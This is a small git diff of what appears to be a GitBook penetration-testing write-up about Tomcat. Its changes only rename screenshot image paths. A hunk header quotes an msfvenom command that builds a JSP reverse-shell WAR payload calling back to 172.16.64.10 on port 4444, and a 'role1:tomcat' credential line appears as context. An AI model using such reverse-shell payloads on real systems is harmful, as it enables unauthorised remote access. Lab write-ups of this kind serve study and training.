@@ -245,7 +245,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o r
 
 ![](<../../../.gitbook/assets/image (13).png>)
 
-![](<../../../.gitbook/assets/image (61).png>)
+![](<../../../.gitbook/assets/image (61) (1).png>)
 
 ![](<../../../.gitbook/assets/image (64).png>)
 
@@ -274,7 +274,7 @@ role1:tomcat
 
 ![](<../../../.gitbook/assets/image (27).png>)
 
-![](<../../../.gitbook/assets/image (22).png>)
+![](<../../../.gitbook/assets/image (22) (1).png>)
 
 ![](<../../../.gitbook/assets/image (55).png>)
 
